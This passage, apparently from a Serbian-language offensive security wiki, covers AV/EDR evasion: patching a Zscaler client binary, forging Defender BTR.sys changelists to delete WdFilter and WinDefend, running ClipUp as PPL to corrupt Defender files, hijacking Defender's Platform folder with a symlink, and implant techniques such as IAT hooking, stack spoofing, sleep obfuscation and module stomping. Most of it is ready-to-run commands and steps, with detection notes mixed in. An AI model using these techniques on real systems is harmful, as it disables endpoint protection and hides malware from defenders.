with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nakon zamene originalnih datoteka i ponovnog pokretanja servisnog steka:

* **Sve** provere bezbednosnog stanja prikazuju **zeleno/usaglašeno**.
* Nepotpisani ili izmenjeni binarni fajlovi mogu da otvore RPC krajnje tačke imenovanih cevi (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler pravilima.

Ova studija slučaja pokazuje kako se odluke o poverenju koje se donose isključivo na klijentskoj strani i jednostavne provere potpisa mogu zaobići uz nekoliko izmena bajtova.

## Zloupotreba pouzdane funkcionalnosti Microsoft Defender `BTR.sys`

Defender-ov drajver **Boot-Time Removal** predstavlja koristan kontraprimer klasičnom BYOVD-u. `BTR.sys` je legitimna Microsoft-ova komponenta za sanaciju, potpisana digitalnim potpisom, bez greške koja omogućava oštećenje memorije i bez IOCTL interfejsa; nakon sticanja administratorskog pristupa i `SeLoadDriverPrivilege`, operator umesto toga može da falsifikuje njegovu privatnu transakciju sanacije i dobije pristup predviđenim operacijama nad datotekama i registrom u Ring-0 režimu. Ovo je **primitiv za neutralizaciju AV/EDR-a nakon kompromitovanja, a ne za početni pristup ili eskalaciju privilegija**, a drajver se može izdvojiti iz resursa `BOOTTIMETOOL` u ciljnom `MpEngine.dll`, umesto da se uveze upadljiv drajver treće strane.<sup>[[36]](#references)</sup>

### Priprema jednokratnog drajvera

Defender obično ispisuje resurs u obliku nasumično nazvane datoteke `[a-z]{8}.sys` i registruje kernel servis sa sličnim imenom. `DriverEntry` čita vrednost `Args` servisa, otvara referencirani NTFS ADS, dešifruje i proverava listu radnji, zapisuje povratne informacije i vraća `0xC0000056` (`STATUS_DELETE_PENDING`) nakon uspešnog izvršavanja, čime se drajver učitava umesto da ostane rezidentan. Falsifikovani servis ima sledeće karakteristične vrednosti.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Tok `:changelist` sadrži jedan blob šifrovan RC4 algoritmom. Analizirane verzije ponovo koriste fiksni ključ od 256 bajtova, pa šifrovanje ne predstavlja granicu za autorizaciju. Ispravan plaintext sadrži globalno zaglavlje od 24 bajta (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC zaglavlja i ID transakcije izveden iz payload-a), zatim putanju za povratne informacije u UTF-16 formatu završenu nulom i proizvoljan broj stavki. Svaka stavka ima zaglavlje od 16 bajtova (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) i podatke specifične za akciju koji se završavaju sa **tačno četiri NUL bajta**. Svaki region zaglavlja/podataka proverava se zasebno pomoću CRC-32 polinoma `0xEDB88320`, početnog stanja `0xFFFFFFFF` i **bez završnog XOR-a** (`~CRC32`); CRC stanje se resetuje za svaki region.<sup>[[36]](#references)[[37]](#references)</sup>

Prihvaćeni ID-jevi akcija otkrivaju ove kernel primitive.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Podaci stavke | Rezultat |
| --- | --- | --- |
| 1 | `[UTF-16 putanja]` | Brisanje datoteke, uključujući zaključanu datoteku |
| 2 | `[UTF-16 putanja]` | Uklanjanje praznog direktorijuma |
| 3 | `[Zastavice][izvor][odredište]` | Premeštanje datoteke na zaštićenu putanju koju odabere napadač; prazno odredište znači brisanje |
| 4 | `[Zastavice][putanja ključa]` | Rekurzivno brisanje ključa registratora |
| 5 | `[Zastavice][putanja ključa + "\\" + vrednost]` | Brisanje vrednosti registratora |
| 6 | `[Zastavice][tip][veličina][putanja ključa + "\\" + vrednost][podaci]` | Kreiranje/ažuriranje vrednosti registratora i kreiranje nedostajućih putanja ključeva |

Kod akcija 5 i 6, separator ključa/vrednosti u žičnom formatu čine **dve uzastopne obrnute kose crte**; konvencionalno formatirana putanja neće biti pravilno razdvojena. Datoteka za povratne informacije uglavnom odražava zahtev, ali prva četiri bajta podataka svake stavke postaju njen rezultujući `NTSTATUS`. Kod akcija 1 i 2, koje nemaju početno polje zastavica, BTR pomera putanju u četiri rezervisana završna bajta kako bi napravio prostor za taj status.<sup>[[36]](#references)</sup>

### Tok rada `BTR_CLI` i prozor ranog pokretanja

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) sprovodi ceo lanac: izdvaja `BTR.sys` iz lokalnog Defender-a, kreira `<random>.sys:changelist` i tok za povratne informacije, serijalizuje/izračunava kontrolne sume/šifruje povezane akcije, direktno kreira ključ usluge u registratoru, a zatim poziva `NtLoadDriver` za `-trigger now` ili ostavlja drajver da se pokrene pri podizanju sistema za `-trigger boot`. Direktno postavljanje u registratoru zaobilazi uobičajenu SCM putanju `CreateServiceW` i zato **ne generiše** događaj instalacije usluge ID 7045. Artefakti pokrenuti pri podizanju sistema mogu se kasnije ukloniti komandom `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nije upotrebljiv jer BTR obavlja operacije nad datotekama iz `DriverEntry` pre nego što storage stack i veza `SystemRoot` budu spremni. `Start=1` uz grupu visokog prioriteta `Boot Bus Extender` umesto toga pokreće izvršavanje u Fazi 1: NTFS je upotrebljiv, ali mnogi bezbednosni drajveri sa pokretanjem pri startu sistema i EDR servisi u user-mode režimu još nisu inicijalizovani. Filteri koji se pokreću pri startu, poput `WdFilter`, možda su već učitani, ali BTR može da ukloni njihove binarne datoteke ili konfiguraciju servisa pre sledećeg pokretanja i može da obriše izvršne datoteke servisa pre nego što ih SCM pokrene. ELAM ne zatvara ovaj jaz jer se BTR pokreće nakon procene drajvera pri pokretanju i ima važeći Microsoft potpis.<sup>[[36]](#references)</sup>

Više radnji se izvršava u jednoj transakciji. PoC dodaje Action 1 na početak za fiksno definisanu putanju `\SystemRoot\Temp\BootClean.log`: BTR kreira ovaj log, zatim obrađuje sopstveni zahtev za brisanje i uklanja ga pre nego što se rastereti. Time se smanjuje količina dokaza, a smeštanje povratnih informacija u `<random>.sys:<random>.dat` omogućava zajedničko uklanjanje drajvera i oba toka.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacije sa visokim signalom

Pravila zasnovana samo na potpisima i Microsoft-ova lista blokiranih ranjivih drajvera ne rešavaju zloupotrebu predviđene funkcionalnosti BTR-a. Dajte prednost sledećim korelacijama ponašanja, uz razlikovanje legitimnog Defender porekla od proizvoljnog pokretača.<sup>[[36]](#references)</sup>

- **Sysmon 15:** kreiranje `.sys:changelist` univerzalno je za pripremu BTR-a. ADS `.dat` prikačen za istu `.sys` datoteku posebno je sumnjiv jer legitimni Defender obično smešta povratne informacije u `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** korelišite direktno kreiranje `HKLM\SYSTEM\CurrentControlSet\Services\<random>` koje sadrži `Args=...:changelist` i `Group=Boot Bus Extender`, a nema odgovarajući događaj instalacije SCM-a.
- **Sysmon 6 -> 23:** korelišite učitavanje poznatog BTR drajvera koji nije pokrenut iz Defender procesa sa naknadnim brisanjem datoteke koje se pripisuje procesu `System`/PID 4, posebno kada su u pitanju bezbednosne binarne datoteke.
- **Sysmon 11 -> 23:** generišite upozorenje na brzo kreiranje i brisanje datoteke `\SystemRoot\Temp\BootClean.log` od strane procesa `System`/PID 4.
- Ograničite i nadgledajte dodeljivanje/omogućavanje privilegije `SeLoadDriverPrivilege`; sam Microsoft potpis nije dovoljan razlog za poverenje kada bezbednosni alat priprema drajver putem `cmd.exe`, PowerShell-a ili nepoznatog procesa.

## Zloupotreba Protected Process Light (PPL) za izmenu AV/EDR-a pomoću LOLBIN-ova

Protected Process Light (PPL) sprovodi hijerarhiju potpisnika/nivoa tako da samo zaštićeni procesi istog ili višeg nivoa mogu da menjaju jedni druge. U napadu, ako možete legitimno da pokrenete binarnu datoteku sa omogućenim PPL-om i kontrolišete njene argumente, možete da pretvorite benignu funkcionalnost (npr. evidentiranje) u ograničenu primitivu za upis, zasnovanu na PPL-u, koja deluje na zaštićene direktorijume koje koriste AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Šta je potrebno da bi se proces pokrenuo kao PPL
- Ciljna EXE datoteka (i sve učitane DLL datoteke) mora biti potpisana EKU-om koji podržava PPL.
- Proces mora biti kreiran pomoću CreateProcess i sledećih oznaka: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora se zatražiti kompatibilan nivo zaštite koji odgovara potpisniku binarne datoteke (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za potpisnike anti-malware softvera, `PROTECTION_LEVEL_WINDOWS` za Windows potpisnike). Pogrešni nivoi dovešće do neuspešnog kreiranja.

Ovde pogledajte i širi uvod u PP/PPL i zaštitu LSASS-a:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Alati za pokretanje
- Pomoćni alat otvorenog koda: CreateProcessAsPPL (bira nivo zaštite i prosleđuje argumente ciljnoj EXE datoteci):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Obrazac upotrebe:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitiv: ClipUp.exe
- Potpisani sistemski binarni fajl `C:\Windows\System32\ClipUp.exe` pokreće sopstveni proces i prihvata parametar za upisivanje log fajla na putanju koju zada pozivalac.
- Kada se pokrene kao PPL proces, upisivanje fajla se obavlja uz PPL zaštitu.
- ClipUp ne može da obrađuje putanje koje sadrže razmake; koristite kratke putanje 8.3 za pristup lokacijama koje su inače zaštićene.

Pomoćni alati za kratke putanje 8.3
- Prikaz kratkih imena: `dir /x` u svakom nadređenom direktorijumu.
- Izvođenje kratke putanje u cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Lanac zloupotrebe (apstraktno)
1) Pokrenite PPL-sposoban LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` pomoću pokretača (npr. CreateProcessAsPPL).
2) Prosledite ClipUp argument za putanju log fajla kako biste iznudili kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Po potrebi koristite kratka imena 8.3.
3) Ako je ciljni binarni fajl obično otvoren/zaključan dok AV radi (npr. MsMpEng.exe), zakažite upis pri pokretanju sistema, pre nego što se AV pokrene, tako što ćete instalirati uslugu sa automatskim pokretanjem koja se pouzdano pokreće ranije. Proverite redosled pokretanja pomoću Process Monitor (boot logging).
4) Pri ponovnom pokretanju, upisivanje uz PPL zaštitu obavlja se pre nego što AV zaključa svoje binarne fajlove, oštećujući ciljni fajl i sprečavajući pokretanje.

Primer poziva (putanje su izostavljene/skraćene radi bezbednosti):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Napomene i ograničenja
- Ne možete da kontrolišete sadržaj koji ClipUp upisuje, osim mesta upisa; ovaj primitiv je pogodan za oštećivanje, a ne za precizno ubacivanje sadržaja.
- Potrebni su lokalni administratorski/SYSTEM privilegije za instaliranje/pokretanje servisa i period za ponovno pokretanje.
- Vreme izvršavanja je ključno: ciljna datoteka ne sme biti otvorena; izvršavanje pri pokretanju sistema izbegava zaključavanje datoteka.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito kada ga pokreću nestandardni pokretači, tokom pokretanja sistema.
- Novi servisi podešeni da automatski pokreću sumnjive binarne datoteke i koji se dosledno pokreću pre Defender/AV-a. Istražite kreiranje/izmenu servisa pre neuspešnog pokretanja Defendera.
- Nadzor integriteta datoteka za binarne datoteke/Platform direktorijume Defendera; neočekivano kreiranje/izmena datoteka od strane procesa sa zastavicama za zaštićene procese.
- Telemetrija ETW/EDR: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i neuobičajenu upotrebu PPL nivoa od strane binarnih datoteka koje nisu AV.

Ublažavanje
- WDAC/Code Integrity: ograničite koje potpisane binarne datoteke mogu da se pokreću kao PPL i pod kojim nadređenim procesima; blokirajte pokretanje ClipUp-a van legitimnih konteksta.
- Higijena servisa: ograničite kreiranje/izmenu servisa koji se automatski pokreću i nadzirite manipulacije redosledom pokretanja.
- Proverite da li su omogućeni Defender tamper protection i zaštite pri ranom pokretanju; istražite greške pri pokretanju koje ukazuju na oštećenje binarnih datoteka.
- Razmotrite onemogućavanje generisanja kratkih imena u formatu 8.3 na diskovima koji sadrže bezbednosne alate, ako je to kompatibilno sa vašim okruženjem (temeljno testirajte).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender bira platformu sa koje se pokreće nabrajanjem potfoldera unutar:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Bira potfolder sa leksikografski najvećim nizom verzije (npr. `4.18.25070.5-0`), a zatim odatle pokreće procese Defender servisa (ažurirajući putanje servisa/registra u skladu s tim). Ovaj izbor uzima u obzir stavke direktorijuma, uključujući reparse points direktorijuma (symlinks). Administrator može to da iskoristi za preusmeravanje Defendera na putanju u koju napadač može da upisuje, čime omogućava DLL sideloading ili ometanje servisa.<sup>[[21]](#references)[[22]](#references)</sup>

Preduslovi
- Lokalni Administrator (potreban za kreiranje direktorijuma/symlinks unutar Platform direktorijuma)
- Mogućnost ponovnog pokretanja sistema ili pokretanja ponovnog izbora Defender platforme (restart servisa pri pokretanju)
- Potrebni su samo ugrađeni alati (`mklink`)

Zašto funkcioniše
- Defender blokira upisivanje u sopstvene direktorijume, ali izbor platforme veruje stavkama direktorijuma i bira verziju sa leksikografski najvećim nazivom, a da pritom ne proverava da li se cilj razrešava na zaštićenu/poverljivu putanju.

Korak po korak (primer)
1) Pripremite kopiju trenutnog Platform direktorijuma u koji možete da upisujete, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Napravite simboličku vezu ka direktorijumu s višom verzijom unutar Platform, koja upućuje na vašu fasciklu:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučuje se ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) pokreće sa preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da vidite novu putanju procesa u okviru `C:\TMP\AV\` i konfiguraciju servisa/registar koji odražavaju tu lokaciju.

Post-exploitation opcije
- DLL sideloading/code execution: Postavite/zamenite DLL-ove koje Defender učitava iz svog direktorijuma aplikacije da biste izvršili kod u Defenderovim procesima. Pogledajte gornji odeljak: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Gašenje servisa/uskraćivanje usluge: Uklonite simboličku vezu verzije da se konfigurisana putanja pri sledećem pokretanju ne bi razrešila i da Defender ne bi uspeo da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne omogućava eskalaciju privilegija; potrebna su administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams mogu premestiti runtime evasion iz C2 implanta u sam ciljni modul tako što će zakačiti njegovu Import Address Table (IAT) i usmeriti odabrane API-je kroz poziciono nezavisan kod (PIC) pod kontrolom napadača. Time se evasion proširuje izvan malog skupa API-ja koje mnogi kitovi izlažu (npr. CreateProcessA), a ista zaštita primenjuje se i na BOF-ove i DLL-ove za post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Pristup na visokom nivou
- Učitajte PIC blob uz ciljni modul pomoću reflective loader-a (dodavanjem na početak ili kao prateću datoteku). PIC mora biti samostalan i poziciono nezavisan.
- Dok se host DLL učitava, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i zakrpite IAT unose ciljanih importa (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) tako da pokazuju na tanke PIC wrapper-e.
- Svaki PIC wrapper izvršava evasion pre nego što pozove stvarni API preko tail-call-a. Uobičajeni evasion postupci uključuju:
  - Maskiranje/uklanjanje maske memorije oko poziva (npr. šifrovanje beacon region-a, RWX→RX, menjanje naziva/ovlašćenja stranica), a zatim vraćanje stanja nakon poziva.
  - Call-Stack Spoofing: napravite bezopasan stek i pređite na ciljni API tako da analiza call stack-a utvrdi očekivane okvire.<sup>[[9]](#references)</sup>
- Radi kompatibilnosti, izvezite interfejs kako bi Aggressor skripta (ili ekvivalent) mogla da registruje API-je za kačenje za Beacon, BOF-ove i DLL-ove za post-exploitation.

Zašto ovde koristiti IAT hooking
- Radi sa svakim kodom koji koristi zakačeni import, bez izmena koda alata i bez oslanjanja na Beacon za proxyovanje određenih API-ja.
- Pokriva DLL-ove za post-exploitation: kačenje LoadLibrary* omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istog maskiranja/zaobilaženja analize steka na njihove API pozive.
- Omogućava pouzdano korišćenje post-exploitation komandi koje pokreću procese, uprkos detekcijama zasnovanim na call stack-u, tako što obavija CreateProcessA/W.

Minimalni prikaz IAT hook-a (x64 pseudokod u C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Beleške
- Primeni zakrpu nakon relokacija/ASLR-a i pre prve upotrebe importa. Reflective loader-i kao što su TitanLdr/AceLdr demonstriraju hooking tokom DllMain-a učitanog modula.
- Wrapper-e drži malim i bezbednim za PIC; pravu API funkciju razreši pomoću originalne IAT vrednosti koju si sačuvao pre zakrpe ili preko LdrGetProcedureAddress.
- Za PIC koristi RW → RX prelaze i izbegavaj da stranice ostanu upisive i izvršive.

Stub za lažiranje steka poziva
- PIC stub-ovi u Draugr stilu prave lažni lanac poziva (povratne adrese unutar bezazlenih modula), a zatim preusmeravaju izvršavanje na pravu API funkciju.
- Time se zaobilaze detekcije koje očekuju uobičajene stekove poziva od Beacon/BOFs ка osetljivim API funkcijama.
- Kombinuj to sa tehnikama stack cutting/stack stitching da bi se izvršavanje smestilo unutar očekivanih frejmova pre prologa API funkcije.

Operativna integracija
- Dodaj reflective loader na početak post-ex DLL-ova, da bi se PIC i hooks automatski inicijalizovali pri učitavanju DLL-a.
- Koristi Aggressor skriptu za registrovanje ciljnih API funkcija, kako bi Beacon i BOFs imali koristi od istog puta za izbegavanje detekcije, bez izmena koda.

Razmatranja za detekciju/DFIR
- IAT integritet: unosi koji ukazuju na adrese koje nisu u image-u (heap/anon); periodična provera import pokazivača.
- Anomalije steka: povratne adrese koje ne pripadaju učitanim image-ovima; nagli prelazi na PIC koji nije u image-u; nedosledna pretka RtlUserThreadStart.
- Telemetrija loader-a: upisi u IAT unutar procesa, rana aktivnost DllMain-а koja menja import thunk-ове, neočekivane RX oblasti nastale pri učitavanju.
- Izbegavanje učitavanja image-а: ako hook-ујеш LoadLibrary*, nadgledaj sumnjiva učitavanja automation/clr assembly-ја koja se poklapaju sa događajima maskiranja memorije.

Povezani gradivni blokovi i primeri
- Reflective loader-и koji obavljaju IAT patching tokom učitavanja (npr. TitanLdr, AceLdr)
- Memory masking hooks (npr. simplehook) i stack-cutting PIC (stackcutting)
- PIC stub-ovi za lažiranje steka poziva (npr. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks preko rezidentnog PICO-a

Ako kontrolišeš reflective loader, možeš da hook-ујеш importe **tokom** `ProcessImports()` tako što ćeš pokazivač loader-a na `GetProcAddress` zameniti prilagođenim resolver-ом koji prvo proverava hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Napravi **rezidentni PICO** (persistent PIC object) koji ostaje aktivan nakon što se privremeni loader PIC oslobodi.
- Izvezi funkciju `setup_hooks()` koja prepisuje import resolver loader-a (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U `_GetProcAddress` preskoči importe po ordinalu i koristi pretragu hook-ова zasnovanu na hash-u, kao što je `__resolve_hook(ror13hash(name))`. Ako hook postoji, vrati ga; u suprotnom pozovi pravi `GetProcAddress`.
- Registruj ciljne hook-ове u vreme linkovanja pomoću unosa Crystal Palace `addhook "MODULE$Func" "hook"`. Hook ostaje važeći zato što se nalazi unutar rezidentnog PICO-a.

Tako se postiže **import-time IAT redirection** bez patch-ovanja code section-а učitanog DLL-a nakon učitavanja.

### Forsiranje hookable import-a kada cilj koristi PEB-walking

Import-time hooks se aktiviraju samo ako se funkcija zaista nalazi u IAT-u cilja. Ako modul razrešava API funkcije pomoću PEB-walk + hash-a (bez import unosa), forsiraj pravi import kako bi putanja `ProcessImports()` loader-a obradila tu funkciju:

- Zameni razrešavanje export-a po hash-u (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom kao što je `&WaitForSingleObject`.
- Kompajler će emitovati IAT unos, što omogućava presretanje dok reflective loader razrešava importe.

### Ekka-stil obfuskacije spavanja/neaktivnosti bez patch-ovanja `Sleep()`

Umesto patch-ovanja funkcije `Sleep`, hook-уј **stvarne wait/IPC primitive** koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Za duga čekanja, obmotaj poziv Ekko-stilom lanca za obfuskaciju koji šifruje image u memoriji tokom neaktivnosti:<sup>[[31]](#references)[[27]](#references)</sup>

- Koristi `CreateTimerQueueTimer` da zakažeš niz callback-ova koji pozivaju `NtContinue` sa pripremljenim `CONTEXT` frejmovima.
- Uobičajeni lanac (x64): postavi image na `PAGE_READWRITE` → šifruj RC4 algoritmom pomoću `advapi32!SystemFunction032` preko celog mapiranog image-а → obavi blokirajuće čekanje → dešifruj RC4 algoritmom → **vrati dozvole za svaki section** prolaskom kroz PE section-е → signaliziraj završetak.
- `RtlCaptureContext` obezbeđuje šablon `CONTEXT`-а; kloniraj ga u više frejmova i postavi registre (`Rip/Rcx/Rdx/R8/R9`) da bi se pozvao svaki korak.

Operativni detalj: za duga čekanja vrati „uspeh“ (npr. `WAIT_OBJECT_0`) kako bi pozivalac nastavio dok je image maskiran. Ovaj obrazac skriva modul od skenera tokom perioda neaktivnosti i izbegava klasični potpis „patch-ovanog `Sleep()`“.

Ideje za detekciju (zasnovane na telemetriji)
- Nizovi callback-ova `CreateTimerQueueTimer` koji upućuju na `NtContinue`.
- Upotreba `advapi32!SystemFunction032` nad velikim, neprekinutim baferima veličine image-а.
- `VirtualProtect` nad velikim opsegom, kog prati prilagođeno vraćanje dozvola za svaki section.

### Runtime CFG registracija za sleep-obfuscation gadgets

Na ciljevima sa omogućenim CFG-om, prvi indirektni skok na gadget usred funkcije, kao što je `jmp [rbx]` ili `jmp rdi`, obično će srušiti proces uz `STATUS_STACK_BUFFER_OVERRUN`, jer gadget nije prisutan u CFG metapodacima modula. Da bi Ekko/Kraken stil lanci opstali unutar ojačanih procesa:<sup>[[30]](#references)</sup>

- Registruj svako indirektno odredište koje lanac koristi pomoću `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i unosa `CFG_CALL_TARGET_VALID`.
- Za adrese unutar učitanih image-ova (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` mora da počinje na **osnovnoj adresi image-а** i da obuhvati **punu veličinu image-а**.
- Za ručno mapirane/PIC/stomped oblasti koristi **osnovnu adresu alokacije** i veličinu alokacije.
- Označi ne samo dispatch gadget već i export-e do kojih se dolazi indirektno (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall-ове), kao i sve izvršive sekcije pod kontrolom napadača koje će postati indirektna odredišta.

Time se ROP/JOP stil lanci za spavanje pretvaraju iz primitive koja „radi samo u procesima bez CFG-a“ u ponovo upotrebljivu primitivu za `explorer.exe`, pregledače, `svchost.exe` i druge krajnje tačke kompajlirane sa `/guard:cf`.

### CET-safe lažiranje steka za uspavane niti

Potpuna zamena `CONTEXT`-а je uočljiva i može da zakaže na sistemima sa CET Shadow Stack-om, jer lažni `Rip` i dalje mora da bude usklađen sa hardverskim shadow stack-ом. Bezbedniji obrazac za maskiranje tokom spavanja je:<sup>[[30]](#references)</sup>

- Izaberi drugu nit u istom procesu i pročitaj granice њеног steka `NT_TIB` / TEB-a (`StackBase`, `StackLimit`) preko `NtQueryInformationThread`.
- Napravi rezervnu kopiju pravog TEB/TIB-a trenutne niti.
- Uhvatи pravi kontekst uspavane niti pomoću `GetThreadContext`.
- Kopiraj **samo** pravi `Rip` u lažni kontekst, a lažni `Rsp`/stanje steka ostavi nepromenjenim.
- Tokom perioda spavanja kopiraj `NT_TIB` lažne niti u TEB trenutne niti, kako bi se stack walker-и odmotavali unutar legitimnog opsega steka.
- Nakon završetka čekanja, vrati originalni TIB i kontekst niti.

Time se čuva instrukcijski pokazivač usklađen sa CET-om, a EDR stack walker-и koji veruju metapodacima steka u TEB-u za proveru odmotavanja bivaju navedeni na pogrešan trag.

### Alternativa zasnovana na APC-u: Kraken Mask

Ako je timer-queue dispatch previše prepoznatljiv po potpisu, isti niz sleep-encrypt-spoof-restore može da se izvrši iz suspendovane pomoćne niti pomoću queued APC-ova:<sup>[[27]](#references)</sup>

- Napravi pomoćnu nit sa `NtTestAlert` kao ulaznom tačkom.
- Postavi pripremljene `CONTEXT` frejmove/APC-ove pomoću `NtQueueApcThread` i obradi ih pomoću `NtAlertResumeThread`.
- Sačuvaj stanje lanca na heap-u umesto na steku pomoćne niti, kako bi se izbeglo iscrpljivanje podrazumevanog steka niti od 64 KB.
- Koristi `NtSignalAndWaitForSingleObject` da atomarno signaliziraš početni događaj i blokiraš nit.
- Suspenduj glavnu nit pre vraćanja TIB-a/konteksta (`NtSuspendThread` → restore → `NtResumeThread`) da bi se smanjio vremenski prozor u kom skener može da uhvati napola vraćen stek.

Time se potpis `CreateTimerQueueTimer` + `NtContinue` zamenjuje potpisom pomoćne niti/APC-a, uz očuvanje istih ciljeva RC4 maskiranja i lažiranja steka.

Dodatne ideje za detekciju
- `NtSetInformationVirtualMemory` sa `VmCfgCallTargetInformation` neposredno pre spavanja, čekanja ili APC dispatch-а.
- `GetThreadContext`/`SetThreadContext` pozivi oko `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ili `ConnectNamedPipe`.
- `NtQueryInformationThread`, kom kog slede direktni upisi u granice steka TEB/TIB-a trenutne niti.
- Lanci `NtQueueApcThread`/`NtAlertResumeThread` koji indirektno dolaze do `SystemFunction032`, `VirtualProtect` ili pomoćnih funkcija za vraćanje dozvola section-а.
- Ponovljena upotreba kratkih gadget potpisa kao što su `FF 23` (`jmp [rbx]`) ili `FF E7` (`jmp rdi`) kao dispatch pivot-а unutar potpisanih modula.


## Precision Module Stomping

Module stomping izvršava payload iz **`.text` section-а DLL-a koji je već mapiran unutar ciljnog procesa**, umesto da alocira očiglednu privatnu izvršivu memoriju ili učita novi žrtveni DLL. Cilj za prepisivanje treba da bude **učitan, disk-backed image** čiji code space može da primi payload bez oštećivanja putanja koda koje su procesu i dalje potrebne.<sup>[[1]](#references)[[2]](#references)</sup>

### Pouzdan izbor cilja

Naivni stomping uobičajenih modula kao što su `uxtheme.dll` ili `comctl32.dll` nije pouzdan: DLL možda nije učitan u udaljeni proces, a premala code oblast će srušiti proces. Pouzdaniji tok rada je:

1. Nabroj module ciljnog procesa i zadrži **listu za uključivanje koja sadrži samo imena** DLL-ova koji su već učitani.
2. Prvo izgradi payload i zabeleži njegovu **tačnu veličinu u bajtovima**.
3. Pregledaj DLL-ove na disku i uporedi PE section **`.text` `Misc_VirtualSize`** sa veličinom payload-а. Ovo je važnije od veličine fajla zato što odražava veličinu izvršivog section-а **kada se mapira u memoriju**.
4. Parsiraj **Export Address Table (EAT)** i izaberi RVA izvezene funkcije kao početni pomeraj za stomp.
5. Izračunaj **blast radius**: ako payload premaši granicu izabrane funkcije, prepisaće susedne export-е raspoređene iza nje u memoriji.

Tipični alati za izviđanje/izbor koji se koriste u praksi:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operativne napomene
